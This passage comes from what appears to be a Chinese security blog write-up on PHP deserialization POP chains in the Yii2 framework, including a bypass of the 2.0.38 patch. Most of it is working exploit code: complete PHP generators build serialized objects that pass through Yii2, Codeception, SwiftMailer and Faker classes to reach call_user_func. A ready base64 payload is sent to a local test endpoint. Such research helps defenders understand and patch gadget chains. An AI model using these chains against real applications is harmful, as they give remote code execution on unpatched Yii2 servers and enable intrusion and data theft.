function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Faker</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span> <span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CreateAction</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BatchQueryResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后拿着生成的 payload</p><p>访问 <code>http://127.0.0.1/yii2/web/index.php?r=test/test&amp;data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NzoicGhwaW5mbyI7czoyOiJpZCI7czoxOiIxIjt9aToxO3M6MzoicnVuIjt9fX19</code></p><p><img src="/../../../../pic/Pasted%20image%2020221116112338.png"></p><h3 id="POP-链-2"><a href="#POP-链-2" class="headerlink" title="POP 链 2"></a>POP 链 2</h3><p>上面是对 <code>__call</code> 方法进行分析，接下来对 <code>close</code> 方法进行分析</p><p>vendor/yiisoft/yii2/web/DbSession.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**  * Ends the current session and store session data.  * @since 2.0.17  */</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getIsActive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token comment">// prepare writeCallback fields before session closes</span>         <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fields</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">composeFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token constant">YII_DEBUG</span> <span class="token operator">?</span> <span class="token function">session_write_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> @<span class="token function">session_write_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在通过 <code>$this-&gt;getIsActive()</code> 方法的情况下回去调用 <code>$this-&gt;composeFields()</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**  * Composes storage field set for session writing.  * @param string $id Optional session id  * @param string $data Optional session data  * @return array storage fields  */</span> <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">composeFields</span><span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$fields</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">writeCallback</span> <span class="token operator">?</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">writeCallback</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">!==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token variable">$fields</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token operator">!==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token variable">$fields</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">return</span> <span class="token variable">$fields</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果 <code>$this-&gt;writeCallback</code> 成立的情况下回去调用函数，可见函数名也是可以由我们控制</p><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><pre class="line-numbers language-none"><code class="language-none">yii\db\BatchQueryResult::__destruct()-&gt;reset()-&gt;close()↓↓↓yii\web\DbSession::close()-&gt;composeFields()-&gt;call_user_func_array↓↓↓yii\rest\IndexAction::run()-&gt;call_user_func<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造 POC</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>web<span class="token punctuation">\</span>DbSession</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DbSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>web</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DbSession</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$writeCallback</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">writeCallback</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span> <span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CreateAction</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BatchQueryResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果一样</p><p><img src="/../../../../pic/Pasted%20image%2020221116113227.png"></p><h2 id="对-2-0-38-版本的补充"><a href="#对-2-0-38-版本的补充" class="headerlink" title="对 2.0.38 版本的补充"></a>对 2.0.38 版本的补充</h2><p>由于修复方式为在 vendor/yiisoft/yii2/db/BatchQueryResult.php 中加入一个 <code>__wakeup</code> 方法防止反序列化该类，但是POP链后面的部分没有进行修改，于是再找一个可以触发 <code>__call</code> 或者 <code>close</code> 的 <code>__destruct</code> 方法即可</p><p>全局搜索一下还真找到了一个</p><p>vendor/codeception/codeception/ext/RunProcess.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">stopProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">stopProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">processes</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$process</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">/** @var $process Process  **/</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$process</span><span class="token operator">-&gt;</span><span class="token function">isRunning</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">output</span><span class="token operator">-&gt;</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'[RunProcess] Stopping '</span> <span class="token operator">.</span> <span class="token variable">$process</span><span class="token operator">-&gt;</span><span class="token function">getCommandLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$process</span><span class="token operator">-&gt;</span><span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$this-&gt;processes</code> 变量可控，后面又调用了 <code>isRunning()</code> 方法，这不送上门来的吗</p><h3 id="POP-链-3"><a href="#POP-链-3" class="headerlink" title="POP 链 3"></a>POP 链 3</h3><h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h4><pre class="line-numbers language-none"><code class="language-none">Codeception\Extension\RunProcess::__destruct()-&gt;stopProcess()-&gt;isRunning()↓↓↓Fake\Generator::__call()-&gt;format()-&gt;call_user_func_array↓↓↓yii\rest\IndexAction::run()-&gt;call_user_func<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成 Payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">RunProcess</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">processes</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Faker</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isRunning'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span> <span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CreateAction</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension<span class="token punctuation">\</span>RunProcess</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RunProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果一样</p><h3 id="POP-链-4"><a href="#POP-链-4" class="headerlink" title="POP 链 4"></a>POP 链 4</h3><p>继续寻找危险的 <code>__destruct</code></p><p>vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * Destructor. */</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">keys</span> <span class="token keyword">as</span> <span class="token variable">$nsKey</span> <span class="token operator">=&gt;</span> <span class="token variable">$null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">clearAll</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用了 <code>$this-&gt;clearAll()</code> 方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * Clear all data in the namespace $nsKey if it exists. * * @param string $nsKey */</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">clearAll</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">keys</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">keys</span><span class="token punctuation">[</span><span class="token variable">$nsKey</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$itemKey</span> <span class="token operator">=&gt;</span> <span class="token variable">$null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">clearKey</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$itemKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">path</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$nsKey</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">path</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$nsKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">keys</span><span class="token punctuation">[</span><span class="token variable">$nsKey</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存在拼接且 <code>$this-&gt;path</code> 与 <code>$nsKey（即 $this-&gt;keys）</code> 可控，可以由此触发 <code>__toString</code> 方法</p><p>接下来就找可以触发 <code>__call</code> 或者 <code>close</code> 的危险方法了</p><p>找到一个 </p><p>vendor/codeception/codeception/src/Codeception/Util/XmlBuilder.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">__dom__</span><span class="token operator">-&gt;</span><span class="token function">saveXML</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>相同的还有</p><p>vendor/phpDocumentor/Reflection/DocBlock/Tags/Covers.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">refers</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">description</span> <span class="token operator">?</span> <span class="token string single-quoted-string">' '</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">description</span><span class="token operator">-&gt;</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>不多赘述了</p><h4 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h4><pre class="line-numbers language-none"><code class="language-none">Swift_KeyCache_DiskKeyCache::__destruct()-&gt;clearAll()↓↓↓Codeception\Util\XmlBuilder::__toString()-&gt;saveXML();↓↓↓Fake\Generator::__call()-&gt;format()-&gt;call_user_func_array↓↓↓yii\rest\IndexAction::run()-&gt;call_user_func<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成 Payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Util</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">XmlBuilder</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$__dom__</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">__dom__</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Faker</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'saveXML'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span> <span 